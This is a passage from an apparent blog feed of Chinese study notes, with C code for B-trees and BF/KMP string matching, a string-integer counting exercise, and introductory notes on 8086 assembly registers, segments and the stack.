new BTNode;<span class="hljs-comment">//新建一个结点作为新的根</span><br><br>newT-&gt;key[<span class="hljs-number">1</span>] = x;<span class="hljs-comment">//写入新根的key[1]</span><br>newT-&gt;ptr[<span class="hljs-number">0</span>] = T;<span class="hljs-comment">//将原来的树根作为新根的左子树</span><br>newT-&gt;ptr[<span class="hljs-number">1</span>] = ap;<span class="hljs-comment">//ap作为新根的右子树</span><br>newT-&gt;keynum = <span class="hljs-number">1</span>;<br>newT-&gt;parent = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">//新根的父亲为空</span><br><br>ap-&gt;parent = newT;<span class="hljs-comment">//ap的父亲为新根</span><br>T-&gt;parent = newT;<span class="hljs-comment">//T的父亲为新根</span><br><br>T = newT;<span class="hljs-comment">//树改成新根引导的</span><br>&#125;<br><br><span class="hljs-comment">//算法7.9　B-树的插入</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">InsertBTree</span><span class="hljs-params">(BTree &amp;T, <span class="hljs-type">int</span> K, BTree q, <span class="hljs-type">int</span> i)</span> &#123;<br><span class="hljs-type">int</span> x = K;<br>BTree ap = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">int</span> finished = FALSE;<span class="hljs-comment">//x表示新插入的关键字，ap为一个空指针</span><br><span class="hljs-keyword">while</span> (q &amp;&amp; !finished) &#123;<br>Insert(q, i, x, ap);      <span class="hljs-comment">//将x和ap分别插入到q-&gt;key[i+1]和q-&gt;ptr[i+1]</span><br><span class="hljs-keyword">if</span> (q-&gt;keynum &lt; m)<br>finished = TRUE;   <span class="hljs-comment">//插入完成</span><br><span class="hljs-keyword">else</span> &#123;                      <span class="hljs-comment">//分裂结点*q</span><br><span class="hljs-type">int</span> s = m / <span class="hljs-number">2</span>;<br>split(q, s, ap);<br>x = ap-&gt;key[<span class="hljs-number">0</span>];<span class="hljs-comment">// x=q-&gt;key[s];</span><br>  <span class="hljs-comment">//将q-&gt;key[s+1..m], q-&gt;ptr[s..m]和q-&gt;recptr[s+1..m] 移入新结点*ap</span><br>q = q-&gt;parent;<br><span class="hljs-keyword">if</span> (q)<br>&#123;<br>i = Search(q, x);<br>&#125;<span class="hljs-comment">//在双亲结点*q中查找x的插入位置</span><br>&#125;<span class="hljs-comment">//else</span><br>&#125;<span class="hljs-comment">//while</span><br><span class="hljs-keyword">if</span> (!finished)    <span class="hljs-comment">//T是空树（参数q初值为NULL）或者根结点已分裂为结点*q和*ap</span><br>NewRoot(T, q, x, ap);<span class="hljs-comment">//生成含信息（T, x, ap）的新的根结点*T，原T和ap为子树指针</span><br><span class="hljs-keyword">return</span>  OK;<br>&#125;<span class="hljs-comment">//InsertBTree//InsertBTree</span><br><br><span class="hljs-comment">//算法7.8　B-树的查找</span><br>Result <span class="hljs-title function_">SearchBTree</span><span class="hljs-params">(BTree &amp;T, <span class="hljs-type">int</span> key)</span> &#123;<br><span class="hljs-comment">/*在m阶B-树T上查找关键字key，返回结果(pt,i,tag)。若查找成功，则特征值tag=1，指针pt所指结点中第i个关键字等于key；否则特征值tag=0，等于key的关键字应插入在指针pt所指结点中第i和第i+1个关键字之间*/</span><br>BTree p = T;<br>BTree q = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">int</span> found = FALSE;<br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<span class="hljs-comment">//初始化，p指向待查结点，q指向p的双亲</span><br><span class="hljs-keyword">while</span> (p &amp;&amp; !found) &#123;<br>i = Search(p, key);<br><span class="hljs-comment">//在p-＞key[1..keynum]中查找i，使得：p-＞key[i]＜=key＜p-＞key[i+1]</span><br><span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span> &amp;&amp; p-&gt;key[i] == key)<br>found = TRUE;<span class="hljs-comment">//找到待查关键字</span><br><span class="hljs-keyword">else</span><br>&#123;<br>q = p;<br>p = p-&gt;ptr[i];<br>&#125;<br>&#125;<br>Result result;<br><span class="hljs-keyword">if</span> (found)<br>&#123;<br>result.pt = p;<br>result.i = i;<br>result.tag = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> result;<br>&#125;              <span class="hljs-comment">//查找成功</span><br><span class="hljs-keyword">else</span><br>&#123;<br>result.pt = q;<br>result.i = i;<br>result.tag = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> result;<br>&#125;              <span class="hljs-comment">//查找不成功，返回K的插入位置信息</span><br>&#125;<span class="hljs-comment">//SearchBTree</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">InitialBTree</span><span class="hljs-params">(BTree &amp;T)</span><br>&#123;<br><span class="hljs-comment">//初始化一个空的根</span><br>T-&gt;keynum = <span class="hljs-number">0</span>;<br>T-&gt;parent = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m + <span class="hljs-number">1</span>; i++)<br>&#123;<br>T-&gt;ptr[i] = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>BTree T = new BTNode;<br>InitialBTree(T);<br><span class="hljs-comment">//先用SearchBTree()找到要插入的位置，得到一个Result结构体</span><br><span class="hljs-comment">//再用InsertBTree()插入数据</span><br>Result result;<br><span class="hljs-type">int</span> a[<span class="hljs-number">11</span>] = &#123; <span class="hljs-number">45</span>,<span class="hljs-number">24</span>,<span class="hljs-number">53</span>,<span class="hljs-number">90</span>,<span class="hljs-number">3</span>,<span class="hljs-number">12</span>,<span class="hljs-number">50</span>,<span class="hljs-number">61</span>,<span class="hljs-number">70</span>,<span class="hljs-number">100</span> &#125;;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>&#123;<br>result = SearchBTree(T, a[i]);<br><span class="hljs-keyword">if</span> (result.tag == <span class="hljs-number">0</span>)<br>&#123;<br>InsertBTree(T, a[i], result.pt, result.i);<br>&#125;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;OK&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>code-串、数组和广义表</title>
    <link href="/2022/02/18/code-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/"/>
    <url>/2022/02/18/code-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h1>1、BF</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLEN 225</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">char</span> ch[MAXLEN + <span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> length;<br>&#125;SString;<br><br><span class="hljs-comment">//总次数：(n-m+1)*m   算法复杂度：O(n*m)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Index</span><span class="hljs-params">(SString S, SString T, <span class="hljs-type">int</span> pos)</span> &#123;<br><span class="hljs-type">int</span> i = pos;<br><span class="hljs-type">int</span> j = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (i &lt;= S.length&amp;&amp;j &lt;= T.length) &#123;<br><span class="hljs-keyword">if</span> (S.ch[i] == T.ch[j]) &#123;<br>++i;<br>++j;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>i = i - j + <span class="hljs-number">2</span>;<br>j = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (j &gt; T.length)<span class="hljs-keyword">return</span> i - T.length;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Index_KMP</span><span class="hljs-params">(SString S, SString T, <span class="hljs-type">int</span> pos)</span><br>&#123;<br><span class="hljs-type">int</span> i = pos;<br><span class="hljs-type">int</span> j = <span class="hljs-number">1</span>;<br><span class="hljs-type">char</span> next[<span class="hljs-number">100</span>];<br><span class="hljs-keyword">while</span> (i &lt;= S.length&amp;&amp;j &lt;= T.length) &#123;<br><span class="hljs-keyword">if</span> (j == <span class="hljs-number">0</span> || S.ch[i] == T.ch[j]) &#123; i++; j++; &#125;<br><span class="hljs-keyword">else</span> j = next[j];  <span class="hljs-comment">//i 不回溯，j后退</span><br>&#125;<br><span class="hljs-keyword">if</span> (j &gt; T.length) <span class="hljs-keyword">return</span> i - T.length;<span class="hljs-comment">//匹配成功</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<span class="hljs-comment">//返回不匹配标志</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_next</span><span class="hljs-params">(SString T, <span class="hljs-type">int</span> next[])</span><br>&#123;<br><span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;<br>next[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (i &lt; T.length) &#123;<br><span class="hljs-keyword">if</span> (j == <span class="hljs-number">0</span> || T.ch[i] == T.ch[j]) &#123;<br>++i;<br>++j;<br>next[i] = j;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>j = next[j];<br>&#125;<br>&#125;<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_nextval</span><span class="hljs-params">(SString T, <span class="hljs-type">int</span> nextval[])</span><br>&#123;<br><span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;<br>nextval[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (i &lt; T.length) &#123;<br><span class="hljs-keyword">if</span> (j == <span class="hljs-number">0</span> || T.ch[i] == T.ch[j]) &#123;<br>++i;<br>++j;<br><span class="hljs-keyword">if</span> (T.ch[i] != T.ch[j]) nextval[i] = j;<br><span class="hljs-keyword">else</span> nextval[i] = nextval[j];<br>&#125;<br><span class="hljs-keyword">else</span> j = nextval[j];<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1>2、</h1><p>输入一个字符串，内有数字和非数字字符 ，如 akl23x456;17960?302gef4563，将其中连续的数字作为一个整体，例如:akl23x456 中的整数有 123 和 456，编程统计其共有多少个整数，并输出这些数。 int CountNumber(SString Str1){ }</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">char</span> ch[<span class="hljs-number">100</span>];<br><span class="hljs-type">int</span> len;<br>&#125;SString;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">CountNumber</span><span class="hljs-params">(SString Str1)</span> &#123;<br><span class="hljs-type">int</span> flag = <span class="hljs-number">0</span>;<span class="hljs-comment">//字符串中是否出现数字的标识</span><br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<span class="hljs-comment">//下标</span><br><span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<span class="hljs-comment">//表示字符串中的数字</span><br><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<span class="hljs-comment">//统计整数个数</span><br><span class="hljs-keyword">while</span>(i&lt;=Str1.len<span class="hljs-number">-1</span>) &#123;<br><span class="hljs-keyword">while</span>((Str1.ch[i] &gt;= <span class="hljs-string">&#x27;0&#x27;</span>)&amp;&amp;(Str1.ch[i] &lt;= <span class="hljs-string">&#x27;9&#x27;</span>)) &#123;<span class="hljs-comment">//是数字时</span><br>num = num * <span class="hljs-number">10</span> + Str1.ch[i]-<span class="hljs-string">&#x27;0&#x27;</span>;<br>i++;<br>flag = <span class="hljs-number">1</span>;<span class="hljs-comment">//标识为数字</span><br>&#125;<br><span class="hljs-keyword">if</span> (flag == <span class="hljs-number">1</span>) &#123;<br>count++;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第%d个整数为%d\n&quot;</span>,count,num);<br>flag = <span class="hljs-number">0</span>;<br>i--;<br>num = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (flag == <span class="hljs-number">0</span>)i++;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;该字符串中共有%d个整数\n&quot;</span>, count);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入一个字符串：&quot;</span>);<br><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br>scanf_s(<span class="hljs-string">&quot;%s&quot;</span>,str,<span class="hljs-number">100</span>);<br>SString S;<br>strcpy_s(S.ch,str);<br><br><span class="hljs-type">int</span> length = <span class="hljs-built_in">strlen</span>(str);<br>S.len = length;<br>CountNumber(S);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>3-寄存器2</title>
    <link href="/2022/02/16/3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%863--%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <url>/2022/02/16/3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%863--%E5%AF%84%E5%AD%98%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1>内存中字的存储</h1><p>两个16进制位对应一个字节，两个字节对应一个位</p><p>任何两个地址连续的内存单元，N号单元和N+1号单元，可以将它们看成两个内存单元，也可以看成一个地址为N的字单元中的高位字节单元和低位字节单元</p><h1>DS和[address]</h1><p>CPU要读取一个内存单元的时候，必须先给出这个内存单元的地址</p><p>在8086CPU中，内存单元由段地址和偏移地址组成</p><p>8086CPU中有一个DS寄存器，通常用来存放要访问的数据的段地址</p><h5 id="mov指令的功能：">mov指令的功能：</h5><ul><li>将数据直接送入寄存器</li><li>将一个寄存器中的内容送入另一个寄存器中</li><li>将一个内存单元中的内容送入一个寄存器</li></ul><h5 id="mov指令的几种形式">mov指令的几种形式</h5><ul><li>mov   寄存器，数据</li><li>mov   寄存器，寄存器</li><li>mov   寄存器，内存单元</li><li>mov   内存单元，寄存器</li><li>mov   段寄存器，寄存器</li></ul><p>ds：段地址，[…]：偏移地址</p><p>执行指令时，8086CPU自动取DS中的书记为内存单元的段地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,1000H<br>mov ds,bx<br>mov al,[0]<br><br>10000H表示为1000:0(段地址：偏移地址)<br>将段地址1000H放入ds<br>用mov al,[0]完成传送（mov指令中的[]说明操作对象是一个内存单元，[]中的0说明这个内存单元的偏移地址是0，它的段地址默认放在ds中）<br></code></pre></td></tr></table></figure><p>8086CPU不支持将数据直接送入段寄存器的操作，但可以直接送入通用寄存器</p><p>数据–&gt;通用寄存器–&gt;段寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">寄存器--&gt;内存<br>mov bx,1000H<br>mov ds,bx<br>mov [0],al<br></code></pre></td></tr></table></figure><h1>字的传送</h1><p>8086CPU是16位结构，有16根数据线，所以可以一次性传送16位的数据，也就是一次性传送一个字</p><h1>小结</h1><ul><li>字在内存中存储时，要用两个地址连续的内存单元来存放，字的低位字节存放在低地址单元中，高位字节存放在高位地址中</li><li>用mov指令访问内存单元，可以在mov指令中只给出单元的偏移地址，此时段地址默认在DS寄存器中</li><li>[address]表示一个偏移地址为address的内存单元</li></ul><h1>栈</h1><p>8086CPU提供相关的指令来以栈的方式访问内存空间，意味着在基于8086CPU编程时，可以将一段内存当作栈来使用</p><p>入栈：PUSH ax（将寄存器ax中的数据送入栈中）</p><p>出栈：POP  ax（从栈顶取出数据送入ax）</p><p>8086CPU的入栈和出栈操作都是以字为单位进行的</p><p>CS：IP指向指令，段寄存器和偏移地址指向的地方存放的是数据</p><p>寄存器CS和IP中存放着当前指令的段地址和偏移地址</p><h5 id="8086CPU中有两个寄存器：">8086CPU中有两个寄存器：</h5><ul><li>段寄存器SS：存放栈顶的段地址</li><li>寄存器SP：存放栈顶的偏移地址</li></ul><p>任意时刻，SS：SP指向栈顶元素</p><h5 id="pop-ax">pop ax</h5><ul><li>将SS：SP指向的内存单元处的数据送入ax中</li><li>SP=SP+2，SS：SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶</li></ul><p>用栈来暂存以后需要恢复的寄存器中的内容时，出栈的顺序要和入栈的顺序相反，因为最后入栈的寄存器的内容在栈顶，所以在恢复时，要最先出栈</p><p>push、pop实质上就是一种内存的传送指令，可以在寄存器和内存之间传送数据，与mov指令不同的是，push和pop指令访问的内存单元的地址不是在指令中给出的，而是由SS：SP指出的</p><p>push、pop等栈操作指令，修改的只是SP，栈顶的变化范围最大为0~FFFFH</p><h1>栈段</h1><p>对于8086PC机，在编程时，可以根据需要，将一段内存单元定义为一个段</p><p>将长度为N（N&lt;=64K）的一组地址连续、起始地址为16的倍数的内存单元当作栈来使用，从而定义了一个栈段</p><p>比如将10010H~1001FH这段长度为16字节的内存空间当作栈来用，以栈的方式进行访问：这段空间就可以成为栈段，段地址为1000H，大小为16字节</p><p>栗子：</p><ul><li>将10000H~1FFFFH这段空间当作栈段，SS=1000H，栈空间大小为64KB，栈最底部的字单元为1000：FFFE</li><li>任意时刻，SS：SP指向栈顶，当栈中只有一个元素时，SS=1000H，SP=FFFEH</li><li>栈为空，就相当于栈中唯一的元素出栈，出栈后，SP=SP+2</li><li>SP原来为FFFFEH，加2后SP=0，所以当栈为空时，SS=1000H，sp=0</li><li>换个角度：<ul><li>任意时刻，SS：SP指向栈顶元素，当栈为空时，栈中没有元素，也就不存在栈顶元素，所以SS：SP只能指向栈的最底部单元下面的单元，该单元的偏移地址为栈最底部的字单元的偏移地址+2，栈最底部字单元的地址为1000：FFFE，所以栈空时SP=0000H</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>汇编基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2-寄存器</title>
    <link href="/2022/02/16/2%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862--%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <url>/2022/02/16/2%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862--%E5%AF%84%E5%AD%98%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1>通用寄存器</h1><p>8086CPU有14个寄存器：AX…BX…CX…DX…SI…DI…SP…BP…IP…CS…SS…DS…ES…PSW</p><p>8086CPU所有的寄存器都是16位的，可以存放两个字节</p><p>AX…BX…CX…DX…通常用来存放一般性数据，被称为通用寄存器</p><h1>物理地址</h1><p>CPU访问内存单元时要给出内存单元的地址</p><p>所有的内存单元构成的存储空间是一个一维的线性空间，将这个唯一的地址称为物理地址</p><h1>16位结构的CPU</h1><p>运算器一次最多可以处理16位的数据</p><p>寄存器的最大宽度为16位</p><p>寄存器和运算器之间的通路是16位</p><h1>地址加法器的工作原理</h1><p>地址加法器合成物理地址的方法：物理地址=段地址*16（16进制的数，左移一位）+偏移地址</p><h1>段的概念</h1><p>内存并没有分段，段的划分来自于CPU</p><p>由于8086CPU用“（段的地址*16）+偏移地址=物理地址”的方式给出内存单元的物理地址，使得我们可以用分段的方式来管理内存</p><p>段地址*16必然是16的倍数，所以一个段的起始地址也一定是16的倍数</p><p>偏移地址为16位，16位地址的寻址能力为64k，所以一个段的最大长度为64K</p><p>偏移地址16位，变化范围为0~FFFFH，仅用偏移地址来寻址最多可以寻64K个内存地址</p><h1>段寄存器</h1><p>用于提供段地址</p><p>8086CPU有4个段寄存器：CS、DS、SS、ES，当8086CPU要访问内存时，由这4个段寄存器提供内存单元的段地址</p><h1>CS和IP</h1><p>CS（代码段寄存器）和IP（指令指针寄存器）是8086CPU中最关键的寄存器，它们指示了CPU当前要读取指令的地址</p><h5 id="8086PC工作过程的简要描述">8086PC工作过程的简要描述</h5><ul><li>从CS：IP指向内存参院读取指令，读取的指令进入指令缓存器</li><li>IP=IP+所读取指令的长度，从而指向下一条指令</li><li>指令指令</li><li>返回第一步，重复整个过程</li></ul><p>在8086CPU加电启动或复位后（即CPU刚开始工作时）CS和IP被设置为CS=FFFFH，IP=0000H</p><p>即在8086PC机刚启动时，CPU从内存FFFF0H单元中读取指令执行</p><p>FFFF0H单元中的指令时8086PC机开机后执行的第一条指令</p><p>在任何时候，CPU将CS、IP中的内容当作指令的段地址和偏移地址，用它们合成指令的物理地址，到内存中读取指令码，执行</p><p>如果说，内存中的一段信息曾被CPU执行过，那么它所在的内存单元比如被</p><h1>修改CS、IP的指令</h1><p>在CPU中，程序员能够用指令读写的部件只有寄存器，程序员可以通过改变寄存器中的内容实现对CPU的控制</p><p>CPU从何处执行指令是由CS、IP中的内容决定的，程序员可以通过改变CS、IP中的内容来控制CPU执行目标指令</p><p>mov指令可以改变8086CPU大部分寄存器的值，被称为传送指令。mov指令不能用于设置CS、IP的值</p><p>8086CPU提供转移指令来改变CS、IP的值</p><h5 id="同时修改CS、IP的内容：">同时修改CS、IP的内容：</h5><ul><li>jmp 段地址：偏移地址</li><li>功能：用指令中的段地址修改CS，偏移地址修改IP</li></ul><h5 id="仅修改IP的内容：">仅修改IP的内容：</h5><ul><li><p>jmp 某一合法寄存器</p></li><li><p>jmp ax  （类似于mov IP，ax）</p></li><li><p>功能：用寄存器中的值修改IP</p></li></ul><h1>代码段</h1><p>对于8086PC机，在编程时，可以根据需要将一组内存单元定义为一个段</p><p>可以将长度为N（N&lt;=64KB）的一组代码，存在一组地址连续、起始地址为16的倍数的内存单元中，这段内存是用来存放代码的，从而定义了一个代码段</p><h1>小结</h1><ul><li>段地址在8086CPU的寄存器中存放，当8086CPU要访问内存时，由段寄存器提供内存单元的段地址</li><li>8086CPU有4个段寄存器，其中CS用来存放指令的段地址</li><li>CS存放指令的段地址，IP存放指令的偏移地址</li><li>8086机中，任意时刻，CPU将CS：IP指向的内容当作指令执行</li><li>8086CPU的工作过程<ul><li>从CS：IP指向内存单元读取指令，读取的指令进入指令缓冲器</li><li>IP指向下一条指令</li><li>执行指令（执行后IP=IP+所执行指令的长度）</li><li>重复</li></ul></li></ul><h1>DEBUG</h1><ul><li>R：查看，改变CPU寄存器的内容</li><li>D：查看内存中的内容</li><li>E：改写内存中的内容</li><li>U：将内存中的机器指令翻译成汇编指令</li><li>T：执行一条及其指令</li><li>A：以汇编指令的格式在内存中写入一条机器指令</li></ul><p>课后练习：11、12</p><p>汇编指令不区分大小写</p>]]></content>
    
    
    <categories>
      
      <category>汇编基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>1-基础知识</title>
    <link href="/2022/02/16/1%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%861/"/>
    <url>/2022/02/16/1%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%861/</url>
    
    <content type="html"><![CDATA[<p>寄存器：简单地讲是CPU中可以存储数据的器件，一个CPU中有多个寄存器。AX、BX都是其中一个寄存器的代号</p><p>汇编语言的组成：汇编指令（机器码的助记符）、伪指令（由编译器执行）、其他符号（由编译器识别）</p><h5 id="存储器">存储器</h5><p>CPU是计算机的核心部件，它控制整个计算机的运作并进行运算。要想让一个CPU工作，就必须向它提供指令和数据</p><p>指令和数据存放在存储器中，也就是平时所说的内存</p><p>磁盘不同于内存，磁盘中的数据或程序如果不读到内存中，就无法被CPU使用</p><img src="/2022/02/16/1%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%861/b-16435356761621.jpg" class=""><p>装有BIOS的ROM：</p><p>​BIOS，基本输入输出系统</p><p>​BIOS是由主板和各类接口卡（如显卡、网卡等）厂商提供的软件系统，可以通过它利用该硬件设备进行最基本的输入输出</p><p>​在主板和某些接口卡上插有存储相应BIOS的ROM</p><h5 id="指令和数据">指令和数据</h5><p>指令和数据是应用上的概念</p><p>在内存或磁盘上，指令和数据没有任何区别，都是二进制信息</p><p>例如：二进制信息1000 1001 1101 1000—&gt;89D8H—&gt;MOV  AV,BX（程序）</p><h5 id="存储单元">存储单元</h5><p>存储器被划分为若干个存储单元，每个存储单元从0开始顺序编号</p><p>单位：</p><ul><li>1KB=1024B(Byte)=2^10^ B</li><li>1MB=1024KB</li><li>1GB=1024MB</li><li>1TB=1024GB</li></ul><h5 id="CPU对存储器的读写">CPU对存储器的读写</h5><p>CPU想要进行数据的读写，必须和外部器件（标准的说法是芯片）进行3类信息的交互：</p><ul><li>存储单元的地址（地址信息）</li><li>器件的选择，读或写命令（控制信息）</li><li>度或写数据（数据信息）</li></ul><p>在计算机中有专门连接CPU和其他芯片的导线，通常称为总线</p><p>总线在逻辑上的划分：</p><ul><li><p>地址总线：</p><p>CPU是通过地址总线来指定存储单元的</p><p>地址总线上能传送多少个不同的信息，CPU就可以对多少个存储单元进行寻址</p></li><li><p>数据总线</p><p>CPU与内存或其他器件之间的数据传送是通过数据总线来进行的</p><p>数据总线的宽度决定了CPU和外界的数据传送速度</p></li><li><p>控制总线</p><p>CPU对外部器件的控制是通过控制总线来进行的</p><p>控制总线是个总称，是一些不同的控制线的集合</p><p>有多少根控制总线，就意味着CPU提供了对外部器件的多少种控制</p><p>控制总线的宽度决定了CPU对外部器件的控制能力</p></li></ul><h5 id="内存地址空间">内存地址空间</h5><p>如果一个CPU的地址线宽度为10，那么可以寻址1024个内存单元，这1024个可寻到的内存单元就构成这个CPU的内存地址空间</p><h5 id="主板">主板</h5><p>每一台PC机中，都有一个主板，主板上有核心器件和一些主要器件</p><p>这些器件通过总线（地址总线、数据总线、控制总线）相连</p><h5 id="接口卡">接口卡</h5><p>计算机系统中，所有可用程序控制其工作的设备，必须受到CPU的控制</p><p>CPU对外部设备不能直接控制，直接控制这些设备工作的是插在扩展插槽上的接口卡</p>]]></content>
    
    
    <categories>
      
